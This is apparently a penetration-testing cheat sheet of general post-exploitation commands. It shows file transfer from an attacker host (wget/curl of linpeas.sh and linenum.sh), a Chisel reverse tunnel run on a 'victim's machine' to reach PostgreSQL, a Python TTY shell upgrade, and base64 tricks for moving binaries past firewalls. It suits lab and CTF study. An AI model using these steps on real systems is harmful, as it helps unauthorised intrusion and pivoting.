# General Commands

### Python server

`python3 -m http.server 8888`

To download the file: `wget http:/KALI_IP//linpeas.sh`

If the remote server does not have `wget`, we can use `cURL`. : `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`

### SCP

Copy file from local to a remote computer:

```bash
scp file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt
# -P to set the ssh port in necessary case
```

Copy file from remote directory to local computer

```bash
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```

### Chisel

Example for postgresql (port 5432). First we need to transfer chisel.

On the attacker's machine:

```
chisel server --port 9002 --reverse
```

On the victim's machine:

```
./chisel client -v 10.10.16.81:9002 R:5432:172.22.0.1:5432
```

And now on the atacker's machine we have the ports 5432 connected. The usage wil be on another tab: `psql -h 10.10.16.81 -U "postgres" -p 5432`

``

#### Spawn a TTY Shell

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Tmux

```
sudo apt install tmux -y
```

* [https://tmuxcheatsheet.com/](https://tmuxcheatsheet.com/)
* [Introduction to termux Ippsec](https://www.youtube.com/watch?v=Lqehvpe\_djs)

### Vim

[https://vimsheet.com/](https://vimsheet.com/)

### base64

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.

```bash
base64 binarytotransfer -w 0
#On the local machine
```

```
echo f0VMR... <SNIP> ...lIuy9i | base64 -d > binarytotransfer
#On the remote machine
```

### md5sum

To ensure the integrity of the transfered file.

```
md5sum transferedfile
```
